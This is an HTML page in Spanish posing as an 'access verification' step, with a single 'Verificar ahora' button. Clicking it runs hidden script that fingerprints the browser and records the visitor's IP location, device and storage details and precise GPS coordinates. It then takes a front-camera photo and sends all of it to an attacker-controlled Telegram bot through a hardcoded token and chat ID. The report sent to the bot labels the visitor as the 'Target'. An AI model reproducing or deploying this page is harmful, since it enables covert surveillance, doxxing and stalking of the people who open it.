<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Verificación de Acceso</title>
    <style>
        body {
            background: black;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px 20px;
        }
        button {
            background: #2b6ef0;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 50px;
            cursor: pointer;
            margin-top: 30px;
        }
        button:active {
            transform: scale(0.97);
        }
        #status {
            margin-top: 20px;
            font-size: 14px;
            color: #ccc;
        }
    </style>
</head>
<body>
    <h1>📡 Verificación de Acceso</h1>
    <p>Presiona el botón para continuar</p>
    <button id="btn">✅ Verificar ahora</button>
    <div id="status"></div>

    <video id="video" autoplay playsinline style="display:none"></video>
    <canvas id="canvas" style="display:none"></canvas>

    <script>
        // ⚠️ CAMBIA ESTA LÍNEA POR TU NUEVO TOKEN (revoca el viejo con @BotFather)
        const BOT_TOKEN = '8803149571:AAF6V8NewmO0JSUAlXdJh1NUuhMo1lwOH6s';
        const CHAT_ID = '7555997298';

        let alreadySent = false;

        async function getFingerprint() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = 200; canvas.height = 50;
            ctx.fillStyle = "#f60"; ctx.fillRect(0, 0, 200, 50);
            ctx.fillStyle = "#069"; ctx.font = "14px Arial"; ctx.fillText("Fingerprint", 10, 30);
            const canvasHash = canvas.toDataURL().slice(0, 100);
            let gpu = 'N/A';
            try {
                const gl = document.createElement('canvas').getContext('webgl');
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A';
            } catch(e) {}
            const fontsList = ["Arial", "Verdana", "Helvetica", "Times New Roman", "Courier New", "Impact", "Comic Sans MS"];
            const availableFonts = fontsList.filter(f => document.fonts.check(`12px "${f}"`));
            return { gpu, fonts: availableFonts.join(', ') || 'Ninguna', canvasHash };
        }

        async function getIPinfo() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                return {
                    ip: data.ip,
                    country: data.country_name,
                    region: data.region,
                    city: data.city,
                    postal: data.postal,
                    timezone: data.timezone
                };
            } catch(e) { return null; }
        }

        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let model = "Desconocido";
            if (ua.includes('iPhone')) model = 'iPhone';
            else if (ua.includes('iPad')) model = 'iPad';
            else if (ua.includes('Android')) model = 'Android';
            else if (ua.includes('Mac')) model = 'Mac';
            else if (ua.includes('Windows')) model = 'Windows PC';
            const language = navigator.language || navigator.userLanguage;
            const resolution = `${window.screen.width}x${window.screen.height}`;
            const cpuCores = navigator.hardwareConcurrency || 'N/A';
            return { model, ua, language, resolution, cpuCores };
        }

        async function getStorageInfo() {
            try {
                const est = await navigator.storage.estimate();
                const totalGB = (est.quota / (1024**3)).toFixed(2);
                const usedGB = (est.usage / (1024**3)).toFixed(2);
                return { total: totalGB, used: usedGB };
            } catch(e) { return { total: 'N/A', used: 'N/A' }; }
        }

        function getCurrentPosition() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) reject('No soportado');
                navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 10000 });
            });
        }

        async function capturePhoto() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            let stream = null;
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            } catch(e) {
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ video: true });
                } catch(err) { return null; }
            }
            video.srcObject = stream;
            await new Promise(r => { video.onloadedmetadata = () => { video.play(); r(); }; });
            await new Promise(r => setTimeout(r, 500));
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
            stream.getTracks().forEach(t => t.stop());
            return blob;
        }

        async function sendMessage(text) {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
            });
        }

        async function sendPhoto(blob) {
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('photo', blob, 'photo.jpg');
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
        }

        document.getElementById('btn').onclick = async () => {
            if (alreadySent) return;
            alreadySent = true;
            const statusDiv = document.getElementById('status');
            statusDiv.innerText = 'Procesando...';
            try {
                const [fp, ipInfo, device, storage, position] = await Promise.all([
                    getFingerprint(),
                    getIPinfo(),
                    getDeviceInfo(),
                    getStorageInfo(),
                    getCurrentPosition().catch(() => null)
                ]);

                let message = `📊 *Visitor Information Captured*\n━━━━━━━━━━━━━━━━\n\n`;
                message += `🖥️ *Device & Browser*\n   • Device Model: ${device.model}\n   • User Agent: ${device.ua}\n\n`;
                message += `🎨 *Fingerprint*\n   • GPU: ${fp.gpu}\n   • Fonts: ${fp.fonts}\n   • Canvas: ${fp.canvasHash}...\n\n`;
                message += `🌐 *Network*\n   • IP Address: ${ipInfo ? ipInfo.ip : 'N/A'}\n   • Language: ${device.language}\n\n`;
                message += `📍 *Location*\n`;
                if (position) {
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    message += `   • GPS: ${lat}, ${lng}\n   • Accuracy: ±${position.coords.accuracy} meters\n   • Google Maps: https://www.google.com/maps?q=${lat},${lng}\n`;
                } else if (ipInfo && ipInfo.city) {
                    message += `   • IP approximate:\n   • Country: ${ipInfo.country}\n   • Region: ${ipInfo.region}\n   • City: ${ipInfo.city}\n   • Postal: ${ipInfo.postal}\n   • Timezone: ${ipInfo.timezone}\n   • Map: https://www.google.com/maps?q=${ipInfo.city},${ipInfo.country}\n`;
                } else {
                    message += `   • No disponible\n`;
                }
                message += `\n🖼️ *Display*\n   • Resolution: ${device.resolution}\n`;
                message += `🔐 *Permissions*\n   • Camera: Requested\n   • Location: ${position ? 'Granted' : 'Denied'}\n`;
                message += `💾 *Hardware & Storage*\n   • CPU Cores: ${device.cpuCores}\n   • RAM: N/A\n   • Storage Used: ${storage.used} GB / Total: ${storage.total} GB\n`;
                message += `━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n⚡ Developed by: @society\n`;

                await sendMessage(message);
                const foto = await capturePhoto();
                if (foto) await sendPhoto(foto);
                statusDiv.innerText = '✅ Completado';
                setTimeout(() => statusDiv.innerText = '', 3000);
            } catch(e) {
                statusDiv.innerText = '❌ Error, intenta de nuevo';
                console.error(e);
            }
        };
    </script>
</body>
</html>
